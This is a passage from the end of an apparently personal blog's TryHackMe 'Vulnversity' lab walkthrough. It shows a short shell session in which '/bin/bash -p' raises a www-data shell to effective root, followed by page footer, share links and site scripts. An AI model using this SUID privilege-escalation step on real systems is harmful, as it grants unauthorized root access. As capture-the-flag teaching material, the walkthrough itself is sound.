+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/bin/bash -p <span class=c1>#to exploit and gain root priv</span>
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>egid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span></code></pre></div><script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script><script type=text/javascript language=javascript>var aax_size="300x250",aax_pubname="anir0y-21",aax_src="302"</script><script type=text/javascript language=javascript src=https://c.amazon-adsystem.com/aax2/assoc.js></script><hr></div><footer class=post-footer><ul class=post-tags><li><a href=https://classroom.anir0y.in/tags/tryhackme/>Tryhackme</a></li><li><a href=https://classroom.anir0y.in/tags/rooms/>Rooms</a></li><li><a href=https://classroom.anir0y.in/tags/thm/>Thm</a></li><li><a href=https://classroom.anir0y.in/tags/vulnversity/>Vulnversity</a></li></ul><nav class=paginav><a class=prev href=https://classroom.anir0y.in/post/thm-room-kenobi/><span class=title>« Prev</span><br><span>TryHackME Room Kenobi</span>
+</a><a class=next href=https://classroom.anir0y.in/post/thm-room-webfundamentals/><span class=title>Next »</span><br><span>Thm Room Web Fundamentals</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on x" href="https://x.com/intent/tweet/?text=TryHackMe%20Room%20Vulnversity&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f&amp;hashtags=tryhackme%2crooms%2cthm%2cVulnversity"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f&amp;title=TryHackMe%20Room%20Vulnversity&amp;summary=TryHackMe%20Room%20Vulnversity&amp;source=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f&title=TryHackMe%20Room%20Vulnversity"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20Room%20Vulnversity%20-%20https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on telegram" href="https://telegram.me/share/url?text=TryHackMe%20Room%20Vulnversity&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe Room Vulnversity on ycombinator" href="https://news.ycombinator.com/submitlink?t=TryHackMe%20Room%20Vulnversity&u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-vulnversity%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>YOU CAN REUSE MY CONTENT</span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
